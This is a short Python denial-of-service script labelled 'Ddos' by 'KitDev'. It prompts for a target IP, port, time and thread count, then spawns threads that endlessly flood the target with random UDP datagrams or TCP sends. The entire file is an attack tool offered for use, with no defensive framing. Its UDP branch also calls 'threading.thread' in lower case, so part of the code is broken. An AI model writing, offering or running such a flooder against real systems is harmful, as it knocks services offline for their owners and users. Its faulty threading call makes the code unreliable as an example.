import random 
import socket 
import threading

print("============================|Ddos|====================")
print("=========================|By KitDev and TCP-UDP-Flood|==================")

ip = str(input("Ip:"))
port = int(input("Port:"))
choice = str(input("UDP [y/n]"))
time = int(input("time:"))
threads = int(input(" threads:"))

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
			print(i +" attack " + ip)
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
			print(i +" attack " + ip)
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
